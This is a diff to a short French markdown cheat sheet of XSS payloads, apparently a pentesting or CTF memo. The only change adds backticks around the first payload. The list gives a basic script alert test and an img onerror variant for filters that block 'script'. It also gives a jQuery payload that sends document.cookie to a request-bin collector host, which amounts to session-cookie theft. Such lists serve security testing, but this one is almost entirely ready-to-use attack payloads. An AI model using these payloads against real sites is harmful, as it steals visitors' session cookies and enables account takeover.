@@ -1,6 +1,6 @@
 # XSS
 
-- &lt;script&gt;alert(1)&lt;/script&gt; *(le payload de base pour tester si la faille est présente)*
+- ```&lt;script&gt;alert(1)&lt;/script&gt;``` *(le payload de base pour tester si la faille est présente)*
 - &lt;img src=x onerror=alert(1) /&gt; *(une alternative si le mot clef “script” est bloqué)*
 - &lt;script&gt;$.get(“[https://votrerequestbin.com?cookie=”.concat(document.cookie)](https://votrerequestbin.com?cookie=%E2%80%9D.concat%28document.cookie%29 "https://votrerequestbin.com?cookie=%E2%80%9D.concat(document.cookie)"), function(response){ console.log(response);});&lt;/script&gt;
 
